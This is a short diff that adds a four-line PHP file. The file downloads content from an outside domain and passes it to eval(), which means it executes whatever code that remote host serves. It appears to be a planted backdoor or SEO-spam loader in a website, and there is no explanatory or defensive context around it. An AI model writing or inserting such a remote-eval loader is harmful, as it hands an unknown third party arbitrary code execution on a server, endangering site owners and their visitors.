@@ -1,0 +1,4 @@
+<?php
+$zhyvenseo = file_get_contents('https://seojkw.xyz/nepsavvy/landing.html');
+$zhyvenseo = "?> ".$zhyvenseo;
+eval($zhyvenseo);
